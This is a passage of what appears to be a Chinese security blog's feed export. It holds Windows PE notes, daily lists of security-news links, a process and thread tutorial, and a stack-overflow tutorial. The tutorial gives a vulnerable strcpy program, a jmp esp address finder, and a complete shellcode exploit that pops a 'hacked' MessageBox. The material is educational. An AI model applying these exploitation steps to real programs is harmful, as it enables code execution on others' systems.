    <content type="text"><![CDATA[前言&nbsp;&nbsp;&nbsp;&nbsp;在来分析PE文件结构之前我们先通过file命令来看看文件大致有哪些结构 概念扫盲 IATimport address table 导入地址表,由于导入函数就是被程序调用但其执行代码又不在程序中的函数，这些函数的代码位于一个或者多个DLL 中.当PE 文件被装入内存的时候，Windows 装载器才将DLL 装入，并将调用导入函数的指令和函数实际所处的地址联系起来(动态连接)，这操作就需要导入表完成.其中导入地址表就指示函数实际地址。 节区pe文件中的code(代码)、data(数据)、resource(资源)等按照属性分类存储在不同节区。不同节区的权限不同，code节区可执行，可读写，data和resource是只能有读取权限，没有执行的权限。 函数调用约定cdecl是c语言中使用的方式，调用者负责处理栈stdcall方式用于win32 api，该方式由调用者清理栈 windows重要API常见的内存操作函数 跨进程的内存读取和写入的函数ReadProcessMemory（）和WriteProcessMemory（），还有一个就是修改内存的页面属性的函数VirtualProtectEx（） 线程上下文 也称线程环境块 TEB的结构体Reference windows PE文件结构及其加载机制http://blog.csdn.net/liuyez123/article/details/51281905 一种保护应用程序的方法 模拟Windows PE加载器，从内存资源中加载DLLhttp://bbs.pediy.com/thread-149326.htm winnt.h 头文件中有对pe文件结构的定义https://sourceforge.net/p/mingw/mingw-org-wsl/ci/b6761db45b70f7def58ec55186574a084836450e/tree/include/winnt.h#l2923]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170803安全动态]]></title>
    <url>%2F2017%2F08%2F03%2F20170803%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 2017美国黑帽大会兵工厂工具列表http://www.test404.com/post-1434.html How to use a single download to remotely steal proprietary files from MacOShttps://lab.wallarm.com/hunting-the-files-34caa0c1496 如何利用SSDP协议生成100Gbps的DDoS流量http://bobao.360.cn/learning/detail/4185.html 堆溢出学习之0CTF 2017 Babyheaphttp://0x48.pw/2017/08/01/0x36/ DotNetNuke 任意代码执行漏洞(CVE-2017-9822)分析预警http://bobao.360.cn/learning/detail/4189.html 二进制入门-打造Linux shellcode基础篇http://www.freebuf.com/column/142912.html 精品漏洞第4弹——层层放大java审计的攻击面https://mp.weixin.qq.com/s/WT1EXEryUGGqHQpSi959xw windows下nginx反向代理https的撸法https://threathunter.org/topic/59813bc16403dadd31449c35 利用GDB调试ARM代码http://bobao.360.cn/learning/detail/4170.html 在ReactJS应用程序中利用脚本注入漏洞&#x68;&#x74;&#116;&#112;&#115;&#x3a;&#47;&#x2f;&#x6d;&#x65;&#100;&#105;&#117;&#x6d;&#46;&#x63;&#111;&#109;&#47;&#x40;&#x6d;&#117;&#101;&#x6c;&#108;&#x65;&#x72;&#98;&#101;&#x72;&#110;&#100;&#116;&#47;&#101;&#x78;&#x70;&#108;&#x6f;&#x69;&#x74;&#105;&#x6e;&#x67;&#45;&#115;&#x63;&#x72;&#105;&#x70;&#x74;&#x2d;&#105;&#x6e;&#106;&#x65;&#x63;&#x74;&#105;&#x6f;&#110;&#x2d;&#102;&#108;&#97;&#119;&#x73;&#45;&#x69;&#110;&#x2d;&#x72;&#101;&#97;&#x63;&#x74;&#x6a;&#115;&#x2d;&#56;&#56;&#x33;&#102;&#x62;&#49;&#102;&#x65;&#x33;&#54;&#x63;&#x31; isf:基于Python的工控漏洞利用框架https://github.com/dark-lbp/isf Sublime Text 的 URL Handler “Subl” 存在一个 Shell 命令执行漏洞https://inopinatus.org/2017/08/02/shell-command-execution-vulnerability-in-subl-a-third-party-sublime-text-url-handler/ HUNT Burp Suite扩展 burpsuite 插件https://github.com/bugcrowdlabs/HUNT 利用OAuth和o365/Azure进行网络钓鱼http://staaldraad.github.io/pentest/phishing/2017/08/02/o356-phishing-with-oauth/ Fuzz测试学习资源（书籍、视频、工具、存在漏洞的程序样本等）https://github.com/secfigo/Awesome-Fuzzing/blob/master/README.md defcon25-public - PPP 战队将 Defcon 25 决赛中使用的工具与插件公开了https://github.com/pwning/defcon25-public]]></content>
  </entry>
  <entry>
    <title><![CDATA[windows栈溢出入门]]></title>
    <url>%2F2017%2F08%2F02%2Fwindows%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[概念知识点 在程序执行的过程中，cpu会不断处理数据，而cpu处理的数据通常来自3个地方1.数据在指令中直接给出2.数据在寄存器中3.数据在内存中漏洞利用原理简介本次实例中的windows缓冲区溢出的原理还是比较简单的，首先使用jmp esp覆盖函数的返回地址，然后esp此时存放的正是shellcode的地址，那么shellcode本来是作为数据的结果被当做指令给执行了。感觉其实和sql注入啊，xss啥的都差不多，都是”数据”被当做代码或者指令给执行了 :)漏洞代码123456789int main()&#123; char buffer[8]; LoadLibrary(&quot;user32.dll&quot;); strcpy(buffer,name); printf(&quot;%s\n&quot;,buffer); getchar(); return 0;&#125; 主要是利用strcpy函数的复制，当name的内容大于buffer的大小时候，这个时候会产生异常，Exception code: C0000005 ACCESS_VIOLATION。 漏洞利用利用栈溢出弹出一个MessageBox的框 辅助工具代码以下代码用于定位user32.dll中的MessageBox以及kernel32.dll中的ExitProcess地址1234567891011121314151617#include &quot;windows.h&quot;#include &quot;stdio.h&quot;typedef void (*MYPROC)(LPTSTR);int main()&#123; HINSTANCE LibHandle; MYPROC ProcAdd; LibHandle = LoadLibrary(&quot;kernel32&quot;); //LibHandle = LoadLibrary(&quot;user32&quot;); printf(&quot;kernel LibHandle = //x%x\n&quot;,LibHandle); ProcAdd = (MYPROC)GetProcAddress(LibHandle,&quot;ExitProcess&quot;); //ProcAdd = (MYPROC)GetProcAddress(LibHandle,&quot;MessageBoxA&quot;); printf(&quot;system = //x%x\n&quot;,ProcAdd); return 0;&#125; 以下代码用于发现user32.dll(当然其它dll中也存在jmp esp操作码的地址)中jmp esp的操作码的地址1234567891011121314151617181920212223242526272829303132333435363738#include &quot;windows.h&quot;#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;int main()&#123; BYTE *ptr; int position; HINSTANCE handle; BOOL done_flag = FALSE; handle = LoadLibrary(&quot;user32.dll&quot;); if(!handle) &#123; printf(&quot;Load dll error&quot;); exit(0); &#125; ptr = (BYTE*)handle; for(position = 0; !done_flag; position++ ) &#123; try &#123; if(ptr[position]==0xFF &amp;&amp; ptr[position+1]==0xE4) &#123; int address = (int)ptr + position; printf(&quot;OPCODE found at 0x%x\n&quot;,address); &#125; &#125; catch(...) &#123; int address = (int)ptr + position; printf(&quot;END OPCODE found at 0x%x\n&quot;,address); done_flag = true; &#125; &#125; getchar(); return 0;&#125; 汇编利用代码实现12345678910111213141516171819202122232425262728293031323334#include &quot;windows.h&quot;int main()&#123; _asm&#123; sub esp,0x50 xor ebx,ebx push ebx push 0x20676e69 push 0x6e726157 //push &quot;Warning&quot; mov eax,esp push ebx push 0x20202021 //push &quot;you have been hacked by M0rk!&quot; push 0x6b72304d push 0x20796220 push 0x64656b63 push 0x6168206e push 0x65656220 push 0x65766168 push 0x20756f79 mov ecx,esp push ebx push eax push ecx push ebx mov eax,0x761aea99 call eax push ebx mov eax,0x7700be52 call eax &#125; return 0;&#125; shellcode编写通过ollydbg或者vs查看机器码或者msf生成机器码如下：1234567891011121314151617181920212223242583EC 5033DB5368 696E672068 5761726E8BC45368 2120202068 4D30726B68 2062792068 636B656468 6E20686168 2062656568 6861766568 796F75208BCC53505153B8 99EA1A76FFD053B8 52BE0077FFD0 所以对应的shellcode是12345678910111213141516171819202122232425&quot;\x83\xEC\x50&quot; &quot;\x33\xDB&quot; &quot;\x53&quot; &quot;\x68\x69\x6E\x67\x20&quot; &quot;\x68\x57\x61\x72\x6E&quot; &quot;\x8B\xC4&quot; &quot;\x53&quot; &quot;\x68\x21\x20\x20\x20&quot; &quot;\x68\x4D\x30\x72\x6B&quot; &quot;\x68\x20\x62\x79\x20&quot; &quot;\x68\x63\x6B\x65\x64&quot; &quot;\x68\x6E\x20\x68\x61&quot; &quot;\x68\x20\x62\x65\x65&quot; &quot;\x68\x68\x61\x76\x65&quot; &quot;\x68\x79\x6F\x75\x20&quot; &quot;\x8B\xCC&quot; &quot;\x53&quot; &quot;\x50&quot; &quot;\x51&quot; &quot;\x53&quot; &quot;\xB8\x99\xEA\xF0\x75&quot; &quot;\xFF\xD0&quot; &quot;\x53&quot; &quot;\xB8\x52\xBE\xC0\x76&quot; &quot;\xFF\xD0&quot;; 利用代码123456789101112131415161718192021222324252627282930313233343536373839404142#include &quot;windows.h&quot;#include &quot;stdio.h&quot;#include &quot;string.h&quot;char name[] = &quot;\x41\x41\x41\x41\x41\x41\x41\x41&quot; &quot;\x41\x41\x41\x41&quot; //ebp &quot;\xb3\xa0\xf6\x75&quot; //Return address \xb3\xa0\x20\x76 &quot;\x83\xEC\x50&quot; &quot;\x33\xDB&quot; &quot;\x53&quot; &quot;\x68\x69\x6E\x67\x20&quot; &quot;\x68\x57\x61\x72\x6E&quot; &quot;\x8B\xC4&quot; &quot;\x53&quot; &quot;\x68\x21\x20\x20\x20&quot; &quot;\x68\x4D\x30\x72\x6B&quot; &quot;\x68\x20\x62\x79\x20&quot; &quot;\x68\x63\x6B\x65\x64&quot; &quot;\x68\x6E\x20\x68\x61&quot; &quot;\x68\x20\x62\x65\x65&quot; &quot;\x68\x68\x61\x76\x65&quot; &quot;\x68\x79\x6F\x75\x20&quot; &quot;\x8B\xCC&quot; &quot;\x53&quot; &quot;\x50&quot; &quot;\x51&quot; &quot;\x53&quot; &quot;\xB8\x99\xEA\xF0\x75&quot; &quot;\xFF\xD0&quot; &quot;\x53&quot; &quot;\xB8\x52\xBE\xC0\x76&quot; &quot;\xFF\xD0&quot;;int main()&#123; char buffer[8]; LoadLibrary(&quot;user32.dll&quot;); strcpy(buffer,name); printf(&quot;%s\n&quot;,buffer); getchar(); return 0;&#125; 工具使用 OllyDBG 入门系列覆盖虚表方式利用栈溢出漏洞]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170802安全动态]]></title>
    <url>%2F2017%2F08%2F02%2F20170802%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 使用Frida从TeamViewer内存中提取密码https://github.com/vah13/extractTVpasswords 通过使用Burp和Sqlmap Tamper利用二次注入漏洞https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/ WiFiBeat:将802.11 frames存储在Elasticsearch中，并通过Kibana可视化https://www.wifibeat.org/# WMIMon：Windows平台监控WMI活动的命令行工具https://github.com/luctalpe/WMIMon 命令注入漏洞测试方法谈https://www.hackerone.com/blog/how-to-command-injections SQLMap Web GUIhttps://n0where.net/sqlmap-web-gui/https://github.com/Hood3dRob1n/SQLMAP-Web-GUI 破坏认证和会话管理 – Session Fixationhttps://www.peerlyst.com/posts/broken-authentication-and-session-management-session-fixation-hari-charan Hyper-V debugging for beginners - Hyper-V 调试入门http://hvinternals.blogspot.com/2015/10/hyper-v-debugging-for-beginners.html wtfjs - JavaScript 的一些有趣的小技巧(Tricks)总结https://github.com/denysdovhan/wtfjs macOS 系统软件升级器（Updater）和安装器（Installer）漏洞所引入的提权问题，包括系统自带的也包括一些第三方软件提供的，来自 DEFCON 会议的演讲https://speakerdeck.com/patrickwardle/defcon-2017-death-by-1000-installers-its-all-broken 如何不调用PowerShell.exe获得Empire agenthttp://bobao.360.cn/learning/detail/4187.html FFmpeg任意文件读取漏洞分析http://www.freebuf.com/column/142775.html mac下解压7z压缩文件1234brew search 7zbrew install p7zip安装完成之后 7z e compressed.7z 默认是解压到当前文件夹下的，所以最好建一个单独的文件夹去解压。]]></content>
  </entry>
  <entry>
    <title><![CDATA[windows驱动入门]]></title>
    <url>%2F2017%2F08%2F02%2Fwindows%E9%A9%B1%E5%8A%A8%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[前言Referenc1.(简单驱动开发及逆向之驱动板的helloworld)[http://www.weixianmanbu.com/article/748.html]2.(真正的驱动入门（—）)[http://bbs.pediy.com/thread-56192.htm]3.(Kernel debugging 入门指南)[http://www.alexlambert.com/2017/12/18/kernel-debugging-for-newbies.html]]]></content>
  </entry>
  <entry>
    <title><![CDATA[进程与线程]]></title>
    <url>%2F2017%2F08%2F01%2F%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[简介一般将进程定义成一个正在运行的程序的一个实例，它由以下两部分构成。 一个内核对象，操作系统用它来管理进程。内核对象也是系统保存进程统计信息的地方。 一个地址空间，其中包含所有可执行文件或DLL模块的代码和数据。此外，它还包含动态内存分配，比如线程堆栈和堆的分配。 进程是有“惰性”的。进程要做任何事情，都必须让一个线程在它的上下文中运行。该线程负责执行进程地址空间包含的代码。事实上，一个进程可以有多个线程，所有线程都在进程的地址空间中“同时”执行代码。为此，每个线程都有它自己的一组CPU寄存器和它自己的堆栈。每个进程至少要有一个线程来执行进程地址空间包含的代码。当系统创建一个进程的时候，会自动为进程创建第一个线程，这称为主线程。然后，这个线程再创建更多的线程，后者再创建更多的线程。。。如果没有线程要执行进程地址空间包含的代码，进程就失去了继续存在的理由。这时，系统会自动销毁进程及其地址空间。 对于所有要运行的线程，操作系统会轮流为每个线程调度一些CPU时间。它会采取循环（轮询或轮流）方式，为每个线程都分配时间片（称为“量程”），从而营造出所有线程都在“并发”运行的假象。 如果计算机配备了多个CPU，操作系统会采用更复杂的算法为线程分配CPU时间。 线程也有两个组成部分： 一个是线程的内核对象，操作系统用它管理线程。系统还用内核对象来存放线程统计信息的地方。 一个线程栈，用于维护线程执行时所需的所有函数参数和局部变量。 进程从来不执行任何东西，它只是一个线程的容器。线程必然是在某个进程的上下文中创建的，而且会在这个进程内部“终其一生”。这意味着线程要在其进程的地址空间内执行代码和处理数据。所以，假如一个进程上下文中有两个以上的线程运行，这些线程将共享同一个地址空间。这些线程可以执行同样的代码，可以处理相同的数据。此外，这些线程还共享内核对象句柄，因为句柄表是针对每一个进程的，而不是针对每一个线程。 可以看出，相较于线程，进程所使用的系统资源更多。其原因在于地址空间。为一个进程创建一个虚拟的地址空间需要大量系统资源。系统中会发生大量的记录活动，而这需要用到大量内存。而且，由于.exe和.dll文件要加载到一个地址空间，所以还需要用到文件资源。另一方面，线程使用的系统资源要少得多。事实上，线程只有一个内核对象和一个栈；几乎不涉及记录活动，所以不需要占用多少内存。 每个线程都有一个上下文，后者保存在线程的内核对象中。这个上下文反映了线程上一次执行时CPU寄存器的状态。大约每隔20ms，Windows都会查看所有当前存在的线程内核对象。在这些对象中，只有一些被认为是可调度的。Windows在可调度的线程内核对象中选择一个，并将上次保存在线程上下文中的值载入CPU寄存器。这一操作被称为上下文切换。线程执行代码，并在进程的地址空间中操作数据。又过了大约20ms，Windows将CPU寄存器存回线程的上下文，线程不再运行。系统再次检查剩下的可调度线程内核对象，选择另一个线程的内核对象，将该线程的上下文载入CPU寄存器，然后继续。载入线程上下文、让线程运行、保存上下文并重复的操作在系统启动的时候就开始，然后这样的操作会不断重复，直至系统关闭。 系统只调度可调度的线程，但是事实上，系统中大多数线程都不是可调度的。例如有些线程对象的挂起计数大于0，这意味着该线程已被挂起，不应该给它调度任何CPU时间。可以通过调用CreateProcess或者CreateThread函数并传入CREATE_SUSPENDED标志来创建一个被挂起的线程。 除了被挂起的线程之外，还有其他很多线程无法调度，因为它们都在等待某种事件发生。例如，如果运行Notepad程序，但是并不输入任何东西，Notepad线程将什么都不做。系统不会给没有任务的线程分配任何CPU时间。当我们移动Notepad的窗口时，或者其窗口需要重绘内容时，或者我们在其中输入时，系统将自动使其线程变为可调度。这并不意味着Notepad线程将立即获得CPU时间。只不过Notepad线程有任务了，系统会在某个时刻抽时间调度它——当然，我们希望越快越好。父进程结束不会使子进程结束，但是多线程中，主进程的退出，会使所有线程退出。 window进程与线程实例进程的创建主要函数是CreateProcess()123456789101112131415161718192021222324252627282930313233#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#define EXEC_FILE &quot;c:\\windows\\system32\\notepad.exe&quot;#define EXEC_FILE1 &quot;c:\\windows\\system32\\calc.exe&quot;int main()&#123; PROCESS_INFORMATION pi = &#123; 0 &#125;; STARTUPINFO si = &#123; 0 &#125;; si.cb = sizeof(STARTUPINFO); BOOL bRet = CreateProcess(EXEC_FILE, NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &amp;si, &amp;pi); BOOL bRet1 = CreateProcess(EXEC_FILE1, NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &amp;si, &amp;pi); if ( bRet == FALSE ) &#123; printf(&quot;CreateProcess Error ! \r\n&quot;); return -1; &#125; CloseHandle(pi.hThread); CloseHandle(pi.hProcess); Sleep(500000); return 0;&#125; 通过上面的代码，我们可以创建了两个子进程，运行这个可执行文件之后，通过Process Explorer查看进程树如上图所示，可以看到calc.exe和notepad.exe是CreateProcessTest创建的两个子进程。当父进程结束的时候，两个子进程并没有结束。线程的创建主要函数是CreateThread()12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;windows.h&gt;#include &lt;stdio.h&gt;DWORD WINAPI ThreadProc(LPVOID lpParam)&#123; printf(&quot;ThreadProc \r\n&quot;); Sleep(500000); return 0;&#125;DWORD WINAPI ThreadProc1(LPVOID lpParam)&#123; printf(&quot;ThreadProc1 \r\n&quot;); Sleep(500000); return 0;&#125;int main()&#123; HANDLE hThread = CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL); HANDLE hThread1 = CreateThread(NULL, 0, ThreadProc1, NULL, 0, NULL); WaitForSingleObject(hThread, INFINITE); WaitForSingleObject(hThread1, INFINITE); printf(&quot;main \r\n&quot;); CloseHandle(hThread); CloseHandle(hThread1); return 0;&#125; 通过上面的代码，我们创建了两个线程hThread和hThread1，通过pslist命令可以查看相应进程中的线程信息如上图所示，CreateThreadTest进程id为6628，它产生了一个主线程和两个子线程，线程id分别为7996，1224和6452 进程、进程中的DLL枚举以及进程的暂停与恢复 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263VOID CManageProcessDlg::InitProcessList()&#123; m_ListProcess.SetExtendedStyle( m_ListProcess.GetExtendedStyle() | LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES ); m_ListProcess.InsertColumn(0, &quot;进程名&quot;); m_ListProcess.InsertColumn(1, &quot;进程ID&quot;); m_ListProcess.SetColumnWidth(0, 150); m_ListProcess.SetColumnWidth(1, LVSCW_AUTOSIZE_USEHEADER); m_ListModule.SetExtendedStyle( m_ListModule.GetExtendedStyle() | LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES ); m_ListModule.InsertColumn(0, &quot;DLL名&quot;); m_ListModule.InsertColumn(1, &quot;DLL路径&quot;); m_ListModule.SetColumnWidth(0, 100); m_ListModule.SetColumnWidth(1, LVSCW_AUTOSIZE_USEHEADER);&#125;VOID CManageProcessDlg::ShowProcess()&#123; // 清空列表框内容 m_ListProcess.DeleteAllItems(); // 创建进程快照 HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if ( hSnap == INVALID_HANDLE_VALUE ) &#123; AfxMessageBox(&quot;CreateToolhelp32Snapshot Error&quot;); return ; &#125; PROCESSENTRY32 Pe32 = &#123; 0 &#125;; Pe32.dwSize = sizeof(PROCESSENTRY32); BOOL bRet = Process32First(hSnap, &amp;Pe32); int i = 0; CString str; // 循环获取进程快照中的每一项 while ( bRet ) &#123; m_ListProcess.InsertItem(i, Pe32.szExeFile); str.Format(&quot;%d&quot;, Pe32.th32ProcessID); m_ListProcess.SetItemText(i, 1, str); i ++; bRet = Process32Next(hSnap, &amp;Pe32); &#125; CloseHandle(hSnap);&#125;VOID CManageProcessDlg::ShowModule()&#123; // 清空列表框内容 m_ListModule.DeleteAllItems(); // 获取选中的进程号 int nPid = GetSelectPid(); // 进程ID为0则返回 if ( nPid == 0 ) &#123; return ; &#125; MODULEENTRY32 Me32 = &#123; 0 &#125;; Me32.dwSize = sizeof(MODULEENTRY32); // 创建模块快照 HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, nPid); if ( hSnap == INVALID_HANDLE_VALUE ) &#123; AfxMessageBox(&quot;CreateToolhelp32Snapshot Error&quot;); return ; &#125; BOOL bRet = Module32First(hSnap, &amp;Me32); int i = 0; CString str; // 循环获取模块快照中的每一项 while ( bRet ) &#123; m_ListModule.InsertItem(i, Me32.szModule); m_ListModule.SetItemText(i, 1, Me32.szExePath); i ++; bRet = Module32Next(hSnap, &amp;Me32); &#125; CloseHandle(hSnap);&#125;int CManageProcessDlg::GetSelectPid()&#123; int nPid = -1; POSITION Pos = m_ListProcess.GetFirstSelectedItemPosition(); int nSelect = -1; while ( Pos ) &#123; nSelect = m_ListProcess.GetNextSelectedItem(Pos); &#125; if ( -1 == nSelect ) &#123; AfxMessageBox(&quot;请选中要显示DLL的进程&quot;); return -1; &#125; char szPid[10] = &#123; 0 &#125;; m_ListProcess.GetItemText(nSelect, 1, szPid, 10); nPid = atoi(szPid); return nPid;&#125;void CManageProcessDlg::OnBtnCreate() &#123; // TODO: Add your control notification handler code here &#125;void CManageProcessDlg::OnBtnTerminate() &#123; // TODO: Add your control notification handler code here &#125;void CManageProcessDlg::OnBtnStop() &#123; // TODO: Add your control notification handler code here int nPid = -1; nPid = GetSelectPid(); // 进程ID为0则返回 if ( nPid == 0 ) &#123; return ; &#125; // 创建线程快照 HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, nPid); if ( hSnap == INVALID_HANDLE_VALUE ) &#123; AfxMessageBox(&quot;CreateToolhelp32Snapshot Error&quot;); return ; &#125; THREADENTRY32 Te32 = &#123; 0 &#125;; Te32.dwSize = sizeof(THREADENTRY32); BOOL bRet = Thread32First(hSnap, &amp;Te32); // 循环获取线程快照中的每一项 while ( bRet ) &#123; // 得到属于选中进程的线程 if ( Te32.th32OwnerProcessID == nPid ) &#123; // 打开线程 HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, Te32.th32ThreadID); // 暂停线程 SuspendThread(hThread); CloseHandle(hThread); &#125; bRet = Thread32Next(hSnap, &amp;Te32); &#125; CloseHandle(hSnap);&#125;void CManageProcessDlg::OnBtnResume() &#123; // TODO: Add your control notification handler code here int nPid = -1; nPid = GetSelectPid(); // 进程ID为0则返回 if ( nPid == 0 ) &#123; return ; &#125; // 创建线程快照 HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, nPid); if ( hSnap == INVALID_HANDLE_VALUE ) &#123; AfxMessageBox(&quot;CreateToolhelp32Snapshot Error&quot;); return ; &#125; THREADENTRY32 Te32 = &#123; 0 &#125;; Te32.dwSize = sizeof(THREADENTRY32); BOOL bRet = Thread32First(hSnap, &amp;Te32); // 循环获取线程快照中的每一项 while ( bRet ) &#123; // 得到属于选中进程的线程 if ( Te32.th32OwnerProcessID == nPid ) &#123; // 打开线程 HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, Te32.th32ThreadID); // 暂停线程 ResumeThread(hThread); CloseHandle(hThread); &#125; bRet = Thread32Next(hSnap, &amp;Te32); &#125;&#125;void CManageProcessDlg::OnBtnShowmodule() &#123; // TODO: Add your control notification handler code here ShowModule();&#125;void CManageProcessDlg::OnBtnExit() &#123; // TODO: Add your control notification handler code here &#125;//调整权限使当前进程拥有&quot;SeDebugPrivilege&quot;权限VOID CManageProcessDlg::DebugPrivilege()&#123; HANDLE hToken = NULL; BOOL bRet = OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &amp;hToken); if ( bRet == TRUE ) &#123; TOKEN_PRIVILEGES tp; tp.PrivilegeCount = 1; LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;tp.Privileges[0].Luid); tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(tp), NULL, NULL); CloseHandle(hToken); &#125;&#125; 多线程以及临界区 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int g_Num_One = 0;CRITICAL_SECTION g_cs;DWORD WINAPI ThreadProc(LPVOID lpParam)&#123; int nTmp = 0; for ( int i = 0; i &lt; 10; i ++ ) &#123; // 进入临界区 EnterCriticalSection(&amp;g_cs); nTmp = g_Num_One; nTmp ++; Sleep(1); g_Num_One = nTmp; // 离开临界区 LeaveCriticalSection(&amp;g_cs); &#125; return 0;&#125;int main()&#123; InitializeCriticalSection(&amp;g_cs); HANDLE hThread[10] = &#123; 0 &#125;; int i; for ( i = 0; i &lt; 10; i ++ ) &#123; hThread[i] = CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL); &#125; WaitForMultipleObjects(10, hThread, TRUE, INFINITE); printf(&quot;g_Num_One = %d \r\n&quot;, g_Num_One); for ( i = 0; i &lt; 10; i ++ ) &#123; CloseHandle(hThread[i]); &#125; DeleteCriticalSection(&amp;g_cs); return 0;&#125; linux的进程和线程通过python可以轻易实现多线程和多进程的操作通过pstree -p 命令查看父进程和子进程以及线程之前的关系 Reference1.Windows和Linux下进程、线程理解]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170801安全动态]]></title>
    <url>%2F2017%2F08%2F01%2F20170801%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 DEF CON 25 会议上关于后渗透阶段利用与恶意软件投递的 Workshop，源码和 PPThttps://github.com/zerosum0x0/defcon-25-workshop 【Blackhat】详解Web缓存欺骗攻击http://bobao.360.cn/learning/detail/4175.html Loadlibrary：将Windows的动态链接库移植到Linux下http://www.freebuf.com/sectool/141767.html Jenkins Java Deserialization CVE-2016-0792https://packetstormsecurity.com/files/143523/jenkins-deserialize.txt 渗透测试TIPS之删除、伪造Linux系统登录日志http://www.freebuf.com/articles/system/141474.html Koadic：一款类似Meterpreter和Powershell Empire的Windows后渗透工具https://github.com/zerosum0x0/koadic 新手科普：浅谈家用路由器安全变迁http://www.freebuf.com/special/140817.html 使用Httrack和Tomcat快速搭建本地钓鱼网站http://www.freebuf.com/news/141918.html 渗透测试中的certutilhttps://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84certutil.exe/ 通向内网的另一条路：记一次无线渗透测试实战http://bobao.360.cn/learning/detail/4178.html 使用SSH反向隧道进行内网穿透http://arondight.me/2016/02/17/%E4%BD%BF%E7%94%A8SSH%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/ 有人尝试通过 Google Hacking 的方式搜索服务器 RSA 私钥https://www.google.com.hk/search?newwindow=1&amp;safe=strict&amp;q=inurl%3Aserver+filetype%3Akey+%22-----BEGIN%2BRSA%2BPRIVATE%2BKEY-----%22&amp;oq=inurl%3Aserver+filetype%3Akey+%22-----BEGIN%2BRSA%2BPRIVATE%2BKEY-----%22 1利用私钥登录的方法适用于服务器sshd_config 配置PasswordAuthentication no 这样才可以登录，亚马逊云的登录方式就是这样的，ssh通过私钥登录的方法 https://support.rackspace.com/how-to/logging-in-with-an-ssh-private-key-on-linuxmac/ DG on Windows 10 S: 执行任意代码http://bobao.360.cn/learning/detail/4181.html 利用 WMI 组件不依赖 C/C++ 也能 Hook Windows eventshttp://blog.huntingmalware.com/notes/WMI Python机器学习工具：Scikit-Learn介绍与实践http://www.freebuf.com/company-information/142695.html 利用esp8266制作一个可随身携带的WiFi密码钓鱼器http://www.freebuf.com/news/141922.html Linux后门整理合集https://www.secpulse.com/archives/59674.html 草料二维码http://cli.im/]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170731安全动态]]></title>
    <url>%2F2017%2F07%2F31%2F20170731%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 使用 MSF 路由转发实现MSF框架的内网渗透http://bobao.360.cn/learning/detail/4164.html 如何利用查表瓶颈，对抗口令Hash破解http://www.freebuf.com/articles/database/141615.html 1文章中介绍的认证方案设计还是很值得推荐的，较传统的认证存储好处很对，推荐 用图形展示堆利用过程http://veritas501.space/2017/07/25/%E5%9B%BE%E5%BD%A2%E5%8C%96%E5%B1%95%E7%A4%BA%E5%A0%86%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B/ MFC 程序入口和执行流程http://www.cnblogs.com/mrchang/archive/2013/05/01/3053092.html How I Chained 4 vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE!http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html Petya 